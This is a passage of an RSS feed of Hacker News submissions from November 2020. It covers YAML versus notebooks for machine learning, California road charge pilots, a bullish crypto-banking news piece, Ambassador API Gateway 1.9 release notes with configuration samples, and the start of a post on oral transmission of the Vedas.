notebooks, this is difficult.</p><p>Python unit testing libraries, like unittest, can be used within a notebook, but standard CI/CD tooling has trouble dealing with notebooks for the same reasons that notebook diffs are hard to read.</p><p>As a result, it’s hard to ship a new notebook to production with a high level of confidence that it won’t break anything—and if something does break, good luck figuring out why.</p><p>Applying CI/CD to YAML files and the code they reference, on the other hand, is straightforward. Devops teams have been doing it for years.</p><h3>Production machine learning is an engineering discipline</h3><p>We built Cortex specifically because we wanted to build things like Spotify’s “Made For You” playlist or Gmail’s Smart Compose. Our focus was not on designing new models, but on building a pipeline to turn models into products.</p><p>To do that, we needed to build an interface that allowed users to specify which code should be executed at what time, with which configuration.</p><p>YAML and notebooks are both tools for that purpose, in a sense. A notebook, at a very basic level, is just a bunch of JSON that references blocks of code and the order in which they should be executed.</p><p>But notebooks prioritize presentation and interactivity at the expense of reproducibility. YAML is the other side of that coin, ignoring presentation in favor of simplicity and reproducibility—making it much better for production.</p><p>‍</p></div></div>]]>
            </description>
            <link>http://www.cortex.dev/post/yaml-not-notebooks-for-machine-learning</link>
            <guid isPermaLink="false">hacker-news-small-sites-25075305</guid>
            <pubDate>Thu, 12 Nov 2020 21:27:16 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[California Road Charge Phased Demonstration]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25075052">thread link</a>) | @gscott
<br/>
November 12, 2020 | http://www.caroadcharge.com/projects/california-four-phase-demonstration/ | <a href="https://web.archive.org/web/*/http://www.caroadcharge.com/projects/california-four-phase-demonstration/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
					<div>
						<div>
							<h3>Pay-at-the-Pump</h3>
							<p>Currently, Californians pay the gas tax when they buy gas. It's so easy you don't even realize that you are doing it. Could a road charge be collected in the same easy way? The purpose of this phase is to test how Californians could pay their road charge user fees when they fill up at the gas station. In addition, this project will test how a road charge could be collected at a charging station for electric vehicles.</p>
						</div>
						<div>
							<div>
								
								<p><img srcset="http://www.caroadcharge.com/media/1vyi2hzt/demo_pay_pump_gettyimages-529978434-0-5x.jpg 570w,
              http://www.caroadcharge.com/media/rxchz5xd/demo_pay_pump_gettyimages-529978434.jpg 1400w" src="http://www.caroadcharge.com/media/rxchz5xd/demo_pay_pump_gettyimages-529978434.jpg" alt="Electric car using a charging station">
							</p></div>
						</div>

					</div>
					<div>
						<div>
							<h3>Usage-Based Insurance</h3>
							<p>As technology advances, many industries are adapting to provide better service to their customers. The auto insurance industry is now offering potential lower insurance rates if customers share more detailed driving information, including the number of miles driven. If an individual has already provided an insurance company with their mileage numbers, why not have the insurance company calculate the road charge and just add it to the bill? This phase will demonstrate how the State could partner with auto insurance companies to serve as account managers that can easily, accurately, and securely calculate and collect road charge payments.</p>
						</div>
						<div>
							<div>
								
								<p><img srcset="http://www.caroadcharge.com/media/p42bis4b/demo_ubi_gettyimages-1095031812-0-5x.jpg 570w,
              http://www.caroadcharge.com/media/erppkx4q/demo_ubi_gettyimages-1095031812.jpg 1400w" src="http://www.caroadcharge.com/media/erppkx4q/demo_ubi_gettyimages-1095031812.jpg" alt="Vehicles on an interstate">
							</p></div>
						</div>

					</div>
					<div>
						<div>
							<h3>Transportation Network Companies</h3>
							<p>One growing shift in California's transportation system is the use of ride hailing services. These transportation network companies are now common in most of the state's urban communities. The mileage for each ride is captured as the basis of the trip's cost, so why not calculate a road charge at the same time? This phase will explore the viability of collecting a road charge using technology already incorporated in real-time ridesharing vehicles and applications.</p>
						</div>
						<div>
							<div>
								
								<p><img srcset="http://www.caroadcharge.com/media/trfphyal/demo_tncs_gettyimages-1056059432-0-5x.jpg 570w,
              http://www.caroadcharge.com/media/wbcd420p/demo_tncs_gettyimages-1056059432.jpg 1400w" src="http://www.caroadcharge.com/media/wbcd420p/demo_tncs_gettyimages-1056059432.jpg" alt="Cityscape with sunrise and cars driving on interstate">
							</p></div>
						</div>

					</div>
					<div>
						<div>
							<h3>Autonomous Vehicles</h3>
							<p>As we look toward the future of transportation, autonomous vehicles loom large on the horizon. The technology in these vehicles collects and analyzes a multitude of information, including the number of miles the vehicle has traversed. The purpose of this phase is to work with an autonomous vehicle operator to demonstrate how to collect vehicle and occupancy data from autonomous vehicles for a road charge system.</p>
						</div>
						<div>
							<div>
								
								<p><img srcset="http://www.caroadcharge.com/media/y2ajob5j/demo_av_gettyimages-1180788478-0-5x.jpg 570w,
              http://www.caroadcharge.com/media/5bxpahy2/demo_av_gettyimages-1180788478.jpg 1400w" src="http://www.caroadcharge.com/media/5bxpahy2/demo_av_gettyimages-1180788478.jpg" alt="Man riding in autonomous vehicle">
							</p></div>
						</div>

					</div>
			</div></div>]]>
            </description>
            <link>http://www.caroadcharge.com/projects/california-four-phase-demonstration/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25075052</guid>
            <pubDate>Thu, 12 Nov 2020 21:06:46 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[It’s Not Long Before Your Bank Will Begin Accepting Bitcoin and Crypto]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25074935">thread link</a>) | @URfejk
<br/>
November 12, 2020 | https://www.cryptovantage.com/news/its-not-long-before-your-bank-will-begin-accepting-bitcoin-and-crypto/ | <a href="https://web.archive.org/web/*/https://www.cryptovantage.com/news/its-not-long-before-your-bank-will-begin-accepting-bitcoin-and-crypto/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
                            <div>
                                <div><p dir="ltr">This is a difficult question to answer, since no major bank has given any concrete indication that it plans to begin accepting and holding actual deposits in cryptocurrency. However, with <a href="https://www.cryptovantage.com/news/paypal-bitcoin-is-big-news-for-crypto-but-exchanges-have-a-big-edge/" target="_blank" rel="noopener noreferrer" data-saferedirecturl="https://www.google.com/url?q=https://www.cryptovantage.com/news/paypal-bitcoin-is-big-news-for-crypto-but-exchanges-have-a-big-edge/&amp;source=gmail&amp;ust=1604594295417000&amp;usg=AFQjCNEXjCqoMJV5LPR9bVZNhvwsvn3HXg">PayPal launching cryptocurrency trading/holding services</a>, it must be only a matter of time before they begin offering their own similar services, for fear of being left behind.</p>
<h2 dir="ltr">Silvergate Bank Profits From Accepting Crypto Business</h2>
<p dir="ltr">Silvergate Bank was one of the first traditional financial institutions to get in on the act of accepting business from cryptocurrency firms. Back in Q4 2017, <a href="https://www.forbes.com/sites/michaeldelcastillo/2020/10/26/silvergate-breaks-record-with-586-million-in-cryptocurrency-deposits/?sh=1c86b3395cc3" target="_blank" rel="noopener noreferrer" data-saferedirecturl="https://www.google.com/url?q=https://www.forbes.com/sites/michaeldelcastillo/2020/10/26/silvergate-breaks-record-with-586-million-in-cryptocurrency-deposits/?sh%3D1c86b3395cc3&amp;source=gmail&amp;ust=1604594295417000&amp;usg=AFQjCNHGkH26Ap1B-mB51eGqDH2wM_BpHQ">it took in $835 million in deposits from crypto companies</a>.</p>
<p dir="ltr">This remains its record, but after falling in the months following Q4 2017, its crypto-related deposits have begun climbing up again this year. Not only did it accept $586 million in deposits from crypto firms, but <a href="http://d18rn0p25nwr6d.cloudfront.net/CIK-0001312109/ae7d42e6-6304-4c40-a07d-ef393c80c445.pdf" target="_blank" rel="noopener noreferrer" data-saferedirecturl="https://www.google.com/url?q=http://d18rn0p25nwr6d.cloudfront.net/CIK-0001312109/ae7d42e6-6304-4c40-a07d-ef393c80c445.pdf&amp;source=gmail&amp;ust=1604594295417000&amp;usg=AFQjCNG7t35yFTgpJ4-azduYImlxDURbUw">its fees from digital currency customers increased by 107%</a> (or by $2.1 million) in the year to June 30, 2020, rising from $2 million to $4.1 million.</p>
<p dir="ltr">In other words, the bank has doubled its cryptocurrency business over the past year, and recent events elsewhere in the world of crypto suggest that this business will only continue growing.</p>
<p dir="ltr">“The Bank’s infrastructure has provided Silvergate with the foundation to succeed in what has become a very digital world and we see an ample runway for further growth,” <a href="https://markets.ft.com/data/announce/detail?dockey=600-202010260625BIZWIRE_USPRX____BW5227-1" target="_blank" rel="noopener noreferrer" data-saferedirecturl="https://www.google.com/url?q=https://markets.ft.com/data/announce/detail?dockey%3D600-202010260625BIZWIRE_USPRX____BW5227-1&amp;source=gmail&amp;ust=1604594295418000&amp;usg=AFQjCNGYLsM56ADZH4gF8FvhIYjZeTHXEA">said Alan Lane</a>, the bank’s CEO.</p>
<p dir="ltr">That there’s an ample runway for further growth is indicated by a number of market and regulatory developments.</p>
<p dir="ltr">Most notably, the price of bitcoin has jumped by over 30% in less than 30 days, with BTC costing $10,552 on October 8 and touching as high as $15,909 November 5.</p>
<p dir="ltr"><img tabindex="0" src="https://lh6.googleusercontent.com/miITOPXIeQF1FKAOPmFwdjB_HSVUZBcSts5F18wxDSrpua8sotqsXlvBXWm86JE2_ZNP_X_9ZzfABY8ZhfteD580w6XwN-9QkvNVqkGmf_l0vBZdGMkXt_ZyeMA3I6z2-dU2bFyR" width="624" height="365"></p>
<p dir="ltr"><em>Source: CoinGecko</em></p>
<p dir="ltr">This growth has been spurred by a number of factors which will continue to push bitcoin’s price higher, such as PayPal’s aforementioned announcement, as well as <a href="https://www.cryptovantage.com/news/square-follows-microstrategy-buys-50-million-worth-of-bitcoin/" target="_blank" rel="noopener noreferrer" data-saferedirecturl="https://www.google.com/url?q=https://www.cryptovantage.com/news/square-follows-microstrategy-buys-50-million-worth-of-bitcoin/&amp;source=gmail&amp;ust=1604594295418000&amp;usg=AFQjCNHF2m3P48ZJKH_S_-KzCFKilKrf2w">recent moves by the likes of MicroStrategy and Square to make bitcoin a reserve asset.</a></p>
<p dir="ltr">But on the regulatory side, the <a href="https://www.occ.gov/news-issuances/news-releases/2020/nr-occ-2020-98.html" target="_blank" rel="noopener noreferrer" data-saferedirecturl="https://www.google.com/url?q=https://www.occ.gov/news-issuances/news-releases/2020/nr-occ-2020-98.html&amp;source=gmail&amp;ust=1604594295418000&amp;usg=AFQjCNHFmiPt9-a-o4pPC2s4CEFupfpRew">U.S. Office of the Comptroller of the Currency announced in July</a> that federally chartered banks may provide cryptocurrency custody services.</p>
<p dir="ltr">“The OCC has found that the authority to provide safekeeping services extends to digital activities and, specifically, that national banks may escrow encryption keys used in connection with digital certificates because a key escrow service is a functional equivalent to physical safekeeping,” it wrote in a letter.</p>
<p dir="ltr">This was — and still is — very significant news. The OCC’s letter was a response to JPMorgan’s May decision to <a href="https://www.cryptovantage.com/news/jp-morgan-accepts-cryptocurrency/" target="_blank" rel="noopener noreferrer" data-saferedirecturl="https://www.google.com/url?q=https://www.cryptovantage.com/news/jp-morgan-accepts-cryptocurrency/&amp;source=gmail&amp;ust=1604594295418000&amp;usg=AFQjCNHKXUipyU4sf3q-rmwKBjJ6QT9fNw">provide banking services to two major crypto-exchanges</a>, Coinbase and Gemini. It was <a href="https://www.bloomberg.com/news/articles/2020-05-12/jpmorgan-is-now-banking-for-bitcoin-exchanges-coinbase-gemini" target="_blank" rel="noopener noreferrer" data-saferedirecturl="https://www.google.com/url?q=https://www.bloomberg.com/news/articles/2020-05-12/jpmorgan-is-now-banking-for-bitcoin-exchanges-coinbase-gemini&amp;source=gmail&amp;ust=1604594295418000&amp;usg=AFQjCNEZupX_7nKdmURa0GOv52zvrnM2GQ">reported at the time</a> that JPMorgan won’t be handling actual cryptocurrencies, but with the OCC’s directive confirming that it’s legal for banks to hold crypto, these two events pave the way for major American banks to begin offering cryptocurrency custody services.</p>
<h2 dir="ltr">The Inevitability of Cryptocurrency</h2>
<p dir="ltr">The specific timeframe can’t be known for sure, but it now looks almost inevitable that major banks will be letting customers hold crypto with them in the not-too distant future.</p>
<p dir="ltr">With <a href="https://capital.com/10bn-asset-manager-calls-bitcoin-its-primary-treasury-reserve-asset" target="_blank" rel="noopener noreferrer" data-saferedirecturl="https://www.google.com/url?q=https://capital.com/10bn-asset-manager-calls-bitcoin-its-primary-treasury-reserve-asset&amp;source=gmail&amp;ust=1604594295418000&amp;usg=AFQjCNGrQURQ-LDJe0ShPrlZ51DJ3t5HGQ">new companies</a> announcing their own <a href="https://www.finextra.com/newsarticle/36790/mode-invests-10-of-cash-reserves-in-bitcoin" target="_blank" rel="noopener noreferrer" data-saferedirecturl="https://www.google.com/url?q=https://www.finextra.com/newsarticle/36790/mode-invests-10-of-cash-reserves-in-bitcoin&amp;source=gmail&amp;ust=1604594295418000&amp;usg=AFQjCNFHbymiMLVIy6kiPzrYCFfUAqc2mA">purchases of bitcoin as a reserve asset</a> virtually every week, there’s a rising demand for custodial services that banks will almost certainly want to meet, on pain of losing business to upstarts.</p>
<p dir="ltr">In fact, a small number of banks have already begun meeting this demand, indicating that most others will eventually follow. In the United States, <a href="https://www.nasdaq.com/articles/standard-chartered-to-launch-institutional-crypto-custody-solution-2020-07-20" target="_blank" rel="noopener noreferrer" data-saferedirecturl="https://www.google.com/url?q=https://www.nasdaq.com/articles/standard-chartered-to-launch-institutional-crypto-custody-solution-2020-07-20&amp;source=gmail&amp;ust=1604594295418000&amp;usg=AFQjCNFRQ8IdP1r2k4jGQEOJ5a5SMimsWg">Standard Chartered began offering a cryptocurrency custody service for institutions</a> in July, while <a href="https://www.fintechfutures.com/2020/08/kb-kookmin-continues-crypto-custody-development-with-new-partners" target="_blank" rel="noopener noreferrer" data-saferedirecturl="https://www.google.com/url?q=https://www.fintechfutures.com/2020/08/kb-kookmin-continues-crypto-custody-development-with-new-partners&amp;source=gmail&amp;ust=1604594295418000&amp;usg=AFQjCNEXV1Bc628yoW0ECEzF17DqQZ2RIg">South Korea’s KB Kookmin Bank began doing something very similar</a> in August.</p>
<p dir="ltr">But banks won’t stop with custody services for institutions. With PayPal taking an early lead in offering cryptocurrency buying-selling and holding services, it’s highly likely that banks will follow, again out of fear of being left behind.</p>
<p dir="ltr">PayPal’s effect on major banks was almost immediate, with a small number announcing cryptocurrency-related initiatives in the days and weeks following PayPal’s own announcement.</p>
<p dir="ltr">In Switzerland, <a href="https://www.financemagnates.com/cryptocurrency/news/switzerland-to-allow-russian-gazprombank-subsidiary-to-offer-crypto-services/" target="_blank" rel="noopener noreferrer" data-saferedirecturl="https://www.google.com/url?q=https://www.financemagnates.com/cryptocurrency/news/switzerland-to-allow-russian-gazprombank-subsidiary-to-offer-crypto-services/&amp;source=gmail&amp;ust=1604594295418000&amp;usg=AFQjCNGPYHRZZ2cAkdgQqrnakjFOEYe99A">Gazprombank announced it would be offering crypto-trading services</a>, while Singapore’s DBS Bank <a href="https://www.financemagnates.com/cryptocurrency/news/dbs-bank-is-launching-crypto-exchange-with-multi-fiat-support/" target="_blank" rel="noopener noreferrer" data-saferedirecturl="https://www.google.com/url?q=https://www.financemagnates.com/cryptocurrency/news/dbs-bank-is-launching-crypto-exchange-with-multi-fiat-support/&amp;source=gmail&amp;ust=1604594295418000&amp;usg=AFQjCNGH9iejoYibtml-fq2LIEf5Wp6tUA">announced its own exchange</a>, complete with custody solutions. And in Mongolia, <a href="https://thepaypers.com/cryptocurrencies/tdb-bank-of-mongolia-to-offer-crypto-related-services--1245432" target="_blank" rel="noopener noreferrer" data-saferedirecturl="https://www.google.com/url?q=https://thepaypers.com/cryptocurrencies/tdb-bank-of-mongolia-to-offer-crypto-related-services--1245432&amp;source=gmail&amp;ust=1604594295418000&amp;usg=AFQjCNFCmGokM90GubRwoP03M6lOHqn_hQ">TDB Bank announced a wide suite of crypto services</a>, including custody, deposits, remittances, loans, and crypto-asset management.</p>
<p dir="ltr"><img tabindex="0" src="https://lh3.googleusercontent.com/SzYr3KtbvtnkezoacxKJHOBpr9IySdQTEbPQ28B_yyhVHV1-IKSUdmDc9zdrS3QhkJGQtzsL9tzfQYEMK_W-ppbR-XfLCg3GYkJ8FD5eIW07bWt0zOn_PKrM_SFngGp9WbtEkZev" width="624" height="459"></p>
<p dir="ltr"><em>Source: Twitter</em></p>
<p dir="ltr">The floodgates are now open, and it’s only a matter of time before larger numbers of major banks elsewhere follow suit. And as <a href="https://twitter.com/TheCryptoLark/status/1322628935344029696" target="_blank" rel="noopener noreferrer" data-saferedirecturl="https://www.google.com/url?q=https://twitter.com/TheCryptoLark/status/1322628935344029696&amp;source=gmail&amp;ust=1604594295418000&amp;usg=AFQjCNEwISBQrymPmIx2lVaKgMFY49pfEQ">the tweet above</a> indicates, central banks may also warm to bitcoin, making it easier for commercial banks to follow.</p>
<h2 dir="ltr">What This Means For Bitcoin</h2>
<p dir="ltr">Needless to say, this is all highly bullish for Bitcoin, and for crypto in general. By making cryptocurrency more accessible to a wider customer base of consumers and businesses, banks will feed demand for crypto. They’ll endow cryptocurrency with a stronger reputation that will draw additional investors, and in the process these additional investors will push the price of bitcoin and other cryptocurrencies higher.</p>
<p dir="ltr">At the same time, the involvement of banks will also potentially invite stricter regulation from national governments and regulators. With major banks exposing themselves to crypto, governments will want to make sure that the financial system doesn’t end up becoming more vulnerable to instability. However, while this may suggest a reining in of crypto to an extent, an increase in regulation will ultimately provide further reassurance to retail and institutional investors, pushing demand for crypto upwards.</p>
<p dir="ltr">In sum, banks will be good for crypto, and crypto will be good for banks.</p>
</div>
                            </div>
                             
                        </div></div>]]>
            </description>
            <link>https://www.cryptovantage.com/news/its-not-long-before-your-bank-will-begin-accepting-bitcoin-and-crypto/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25074935</guid>
            <pubDate>Thu, 12 Nov 2020 20:58:41 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Kubernetes-native Ambassador API Gateway 1.9 released]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25074560">thread link</a>) | @rdli
<br/>
November 12, 2020 | https://blog.getambassador.io/custom-error-responses-oauth2-improvements-live-debugging-flexible-dev-portal-3c98e9e978bb | <a href="https://web.archive.org/web/*/https://blog.getambassador.io/custom-error-responses-oauth2-improvements-live-debugging-flexible-dev-portal-3c98e9e978bb">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><section><div><div><h2 id="f07a">FEATURE RELEASE</h2><h2 id="c250">Edge Stack and API Gateway 1.9 available</h2><div><div><div><p><a href="https://medium.com/@rdli?source=post_page-----3c98e9e978bb--------------------------------" rel="noopener"><img alt="Richard Li" src="https://miro.medium.com/fit/c/96/96/0*ZzZAOu8-_Umpg5BM.jpeg" width="48" height="48"></a></p></div></div></div><figure><div role="button" tabindex="0"><div><div><p><img alt="Image for post" src="https://miro.medium.com/max/10000/1*VrrAAgbxH5tjXjRX9uux0g.png" width="5000" height="2708" srcset="https://miro.medium.com/max/552/1*VrrAAgbxH5tjXjRX9uux0g.png 276w, https://miro.medium.com/max/1104/1*VrrAAgbxH5tjXjRX9uux0g.png 552w, https://miro.medium.com/max/1280/1*VrrAAgbxH5tjXjRX9uux0g.png 640w, https://miro.medium.com/max/1400/1*VrrAAgbxH5tjXjRX9uux0g.png 700w" sizes="700px" data-old-src="https://miro.medium.com/max/60/1*VrrAAgbxH5tjXjRX9uux0g.png?q=20"></p></div></div></div></figure><p id="a0c3">We’re excited to announce the release of the Ambassador API Gateway and Edge Stack 1.9. This major release adds support for commonly requested use cases, including custom error responses, a more flexible developer portal, OAuth2 improvements, and more “production-at-scale” enhancements.</p><p id="46b7">Generic 404 error pages, begone! The 1.9 release adds support for custom error responses based on HTTP status codes. The mechanism introduced in this release is very flexible, supporting custom error responses on both a per <code>Mapping</code> basis and a per <code>module</code> basis.</p><p id="1394">Here’s a sample configuration:</p><pre><span id="0e09">apiVersion: getambassador.io/v2<br>kind: Module<br>metadata:<br>  name: ambassador<br>  namespace: ambassador<br>spec:<br>  config:<br>    error_response_overrides:<br>      - on_status_code: 404<br>        body:<br>          text_format: "File not found"<br>      - on_status_code: 500<br>        body:<br>          json_format:<br>            error: "Application error"<br>            status: "%RESPONSE_CODE%"<br>            cluster: "%UPSTREAM_CLUSTER%"</span></pre><p id="ccb1">For more complex error responses, the response can be written as a separate HTML document and does not need to be inline with the configuration.</p><p id="4602">OAuth2 is a complex specification. In 1.9, the <code>OAuth2</code> filter now supports every draft of the scope validation specification (RFC 8693). Also, support for inheriting scope arguments when delegating to a <code>JWT</code> filter from an <code>OAuth2</code> filter are now supported. This ensures compatibility with a much broader range of Identity Providers, which implement different drafts of the OAuth2 specification.</p><p id="5e56">The <code>OAuth2</code> filter now supports RFC 7523 JWT assertions. This enables more use cases, e.g., using asymmetric cryptography to authenticate to Azure instead of a shared password.</p><figure><div></div><figcaption>OAuth2 improvements in Edge Stack 1.9</figcaption></figure><p id="71dc">The Developer Portal now supports:</p><ul><li id="6f58">Swagger/OpenAPI docs published at arbitrary URLs</li><li id="3062">Selecting specific services to display in the portal</li><li id="7a6f">Support for public/private API documentation</li></ul><p id="5584">These configurations are part of the <code>DevPortal</code> resource which dynamically configures the Developer Portal. Automatic polling of all documentation is now off by default, and a new attribute, <code>docs</code>, on <code>Mapping</code> resources is used to configure API documentation. Here’s an example:</p><pre><span id="bc18">apiVersion: getambassador.io/v2<br>kind:  Mapping<br>metadata:<br>  name:  service-a<br>spec:<br>  prefix: /service-a/<br>  rewrite: /srv/<br>  service: service-a:5000<br>  docs:<br>    path: /openapi/<br>---<br>apiVersion: getambassador.io/v2<br>kind:  DevPortal<br>metadata:<br>  name:  ambassador<br>spec:<br>  default: true<br>  content:<br>    url: https://github.com/datawire/devportal-content.git<br>  selector:<br>    matchLabels:<br>      public-api: "true"    <br>      documented: "true"</span></pre><p id="cfca">For more details, see the <a href="https://www.getambassador.io/docs/latest/topics/using/dev-portal/" rel="noopener">updated Developer Portal documentation</a>.</p><p id="d7ed">Ambassador is deployed in thousands of mission critical environments. When something isn’t working as it should, it’s critical to quickly rectify the issue. With 1.9, we’re introducing a live debugging endpoint that is exposed inside the cluster that provides live status information. Information included in the endpoint includes timer information (e.g., how long it took to compute a new Envoy configuration) as well as real-time information about resource usage (e.g., memory usage).</p><pre><span id="336f">/ambassador $ curl localhost:8877/debug<br>{<br>  "timers": {<br>    "check_alive": "2824, 465.838µs/62.327255ms/123.436247ms",<br>    "check_ready": "2824, 544.802µs/60.071622ms/188.105761ms",<br>    "consulUpdate": "0, 0s/0s/0s",<br>    "katesUpdate": "17663, 33.543µs/74.046µs/276.191659ms",<br>    "notifyWebhook:diagd": "3, 3.544200509s/3.780843008s/4.185688573s",<br>    "notifyWebhook:edgestack sidecar": "3, 31.212198ms/44.493156ms/56.494476ms",<br>    "notifyWebhooks": "3, 3.590031304s/3.825434799s/4.217081081s",<br>    "parseAnnotations": "3, 47.932µs/802.617µs/2.021262ms",<br>    "reconcileConsul": "3, 119.776µs/196.311µs/247.394µs",<br>    "reconcileSecrets": "3, 56.494µs/147.863µs/194.434µs"<br>  },<br>  "values": {<br>    "envoyReconfigs": {<br>      "times": [<br>        "2020-11-10T18:02:55.230807114Z",<br>        "2020-11-10T18:03:02.573500647Z",<br>        "2020-11-10T18:03:06.960565035Z",<br>        "2020-11-10T18:03:10.403266958Z"<br>      ],<br>      "staleCount": 3,<br>      "staleMax": 0,<br>      "synced": true<br>    },<br>    "memory": "0.58Gi of 1.95Gi (29%)"<br>  }<br>}<br>/ambassador $</span></pre><p id="c3a9">API Gateway + Edge Stack:</p><ul><li id="1e46">With <code>AMBASSADOR_FAST_RECONFIGURE</code> make sure health checks can’t get starved during a long reconfigure</li><li id="8788">With <code>AMBASSADOR_FAST_RECONFIGURE</code>, rate limit based on actual memory usage to avoid the pod getting killed for consuming too much memory</li><li id="395f">Alpine upgraded to 3.12 from 3.10</li><li id="a0be">GNU libc upgraded from 2.30 to 2.32</li><li id="d2e3">Python upgraded from 3.7 to 3.8, with dependencies updated to fix CVE-2020–25659</li><li id="f6a9">Knative serving tests updated from 0.11.0 to 0.18.0 (thanks, Noah Fontes!)</li><li id="f8e6"><code>ConsulResolver</code> will now fallback to the <code>Address</code> of a Consul service if <code>Service.Address</code> is not set</li><li id="23b1">The <code>RateLimitService</code> and <code>AuthService</code> configs now support switching between gRPC protcol versions <code>v2</code> and <code>v2alpha</code></li><li id="ebb3">The <code>TracingService</code> Zipkin configuration now supports setting <code>collector_hostname</code> to tell Envoy which host header to set when sending spans to the collector; this is required for New Relic APM support</li><li id="356f">Mixed <code>Mapping</code>s with and without <code>host_redirect</code> will not crash</li><li id="5380">Support for enabling metrics on gRPC requests, rather than only HTTP requests (thanks, Felipe Roveran!)</li><li id="9759">Documentation on how to build Ambassador completely inside Docker (thanks Rahul Saini!)</li><li id="6f1c">Fixed spurious error message when using <code>prefix_rewrite</code> (thanks, <a href="https://github.com/obataku" rel="noopener">Obataku</a>!)</li><li id="cf71">Guard <code>/metrics</code> against uninitialized IR (thanks, Markus Jevring!)</li></ul><p id="d994">Edge Stack only:</p><ul><li id="1562">How the<code>OAuth2</code> filter authenticates itself to the identity provider is now configurable with the <code>clientAuthentication</code> setting</li><li id="75e3">The <code>OAuth2</code> Filter can now use RFC 7523 JWT assertions to authenticate itself to the identity provider; this is usable with all grant types.</li><li id="9fbe">When validating a JWT’s scope, the <code>JWT</code> and <code>OAuth2</code> Filters now support not just RFC 8693 behavior, but also the behavior of various drafts leading to it, making JWT scope validation usable with more identity providers.</li><li id="3d4c">The <code>OAuth2</code> Filter now has <code>inheritScopeArgument</code> and <code>stripInheritedScope</code> settings that can further customize the behavior of <code>accessTokenJWTFilter</code>.</li><li id="f47f">The <code>OAuth2</code> Filter argument <code>scopes</code> has been renamed to <code>scope</code>, for consistency. The name <code>scopes</code> is deprecated, but will continue to work for backward compatibility.</li><li id="3218"><code>OAuth2</code> Filter: Don't have <code>accessTokenValidation: auto</code> fall back to "userinfo" validation for a client_credentials grant; it doesn't make sense there and only serves to obscure a more useful error message.</li></ul><p id="b543">The Ambassador Edge Stack is a complete superset of the open-source Ambassador API Gateway, with integrated support for rate limiting, authentication, filter management, and more. You can install the Ambassador Edge Stack in a few steps with the <a href="https://www.getambassador.io/docs/latest/tutorials/getting-started/" rel="noopener">quick start</a>.</p><h2 id="b59d">Fast, customized configuration</h2><p id="d57d">The <a href="https://app.getambassador.io/initializer/" rel="noopener">K8s Initializer</a> will generate customized YAML configuration for your Edge Stack installation, based on your specific requirements. Confused about the right configuration for TLS termination, observability, authentication, or continuous delivery? Use the <a href="https://app.getambassador.io/initializer/" rel="noopener">Initializer</a> to generate your configuration for you.</p><p id="56b2">The latest versions of Ambassador are now available here:</p><ul><li id="6954">Ambassador API Gateway: <a href="https://hub.docker.com/r/datawire/ambassador" rel="noopener">https://hub.docker.com/r/datawire/ambassador</a></li><li id="72cf">Ambassador Edge Stack: <a href="https://hub.docker.com/r/datawire/aes" rel="noopener">https://hub.docker.com/r/datawire/aes</a></li></ul><p id="1f8c">You can also install it with Helm.</p><pre><span id="9df9"># Add repository and create namespace<br>helm repo add datawire<a href="https://www.getambassador.io/" rel="noopener"> https://www.getambassador.io</a></span><span id="6674"># Helm 3<br>kubectl create namespace ambassador &amp;&amp; helm install ambassador — namespace ambassador datawire/ambassador</span><span id="1238"># Helm 2<br>kubectl create namespace ambassador &amp;&amp; helm install — name ambassador — namespace ambassador datawire/ambassador</span></pre><p id="de9c">To install the Ambassador Edge Stack, follow the <a href="https://www.getambassador.io/docs/latest/tutorials/getting-started/" rel="noopener">quick start</a>.</p><p id="86a6">We’re hosting a four day online meetup concurrent with KubeCon NA, with lightning talks by many of our Ambassador engineers. If you’re interested, <a href="https://www.getambassador.io/ambassador-fest/" rel="noopener">check out the schedule</a> and drop by! We’re also be giving out T-shirts, too!</p></div></div></section></div></div>]]>
            </description>
            <link>https://blog.getambassador.io/custom-error-responses-oauth2-improvements-live-debugging-flexible-dev-portal-3c98e9e978bb</link>
            <guid isPermaLink="false">hacker-news-small-sites-25074560</guid>
            <pubDate>Thu, 12 Nov 2020 20:32:47 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The Vedas: three and a half thousand years of oral information transmission]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 1 (<a href="https://news.ycombinator.com/item?id=25074298">thread link</a>) | @Bluestein
<br/>
November 12, 2020 | https://generalist.academy/2020/10/18/memory-culture/ | <a href="https://web.archive.org/web/*/https://generalist.academy/2020/10/18/memory-culture/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article id="post-4386">
	
		<p>
By  on <a href="https://generalist.academy/2020/10/18/memory-culture/" title="7:00 am" rel="bookmark"><time datetime="2020-10-18T07:00:00+13:00">October 18, 2020</time></a>	• 
	</p>
	<section>
<p>Through sophisticated mnemonics and error-checking mechanisms the Vedas, the canonical religious texts of Hinduism, have been transmitted orally for three and a half thousand years with shocking precision in both word and sound.</p>

<p>This is the 600th regular post on this website! My tradition for the “00” posts is to write something about the nature of knowledge. Today, I wanted to write a bit about oral tradition.</p>
<p>&nbsp;A lot of 20th century scholarship ignored or undervalued the role of non-written forms of knowledge transmission. The written text was king, and everything else – oral tradition, especially – was irrelevant. In many cases this was a convenient way of discounting knowledge from colonised peoples, which is of course nonsense: many of the foundational texts of literature, religion, law, and history have their origin in oral tradition, so we ignore it at our peril. Some other time I’ll write about the Homeric Question (to what extent can we say that Homer wrote <em>The Odyssey</em> and <em>The Illiad</em>?), but this post is about something much much older.</p>
<p>The Vedas are the foundational “texts” of Hinduism. I put “texts” in quotation marks deliberately. They’ve certainly been written down, but the primary and authoritative form of the Vedas is not text. Instead, the oldest parts of the Vedas have been passed down orally, from teacher to student, for an incredible three and a half thousand years. And even more incredibly, they are thought to have changed very little in that time.</p>
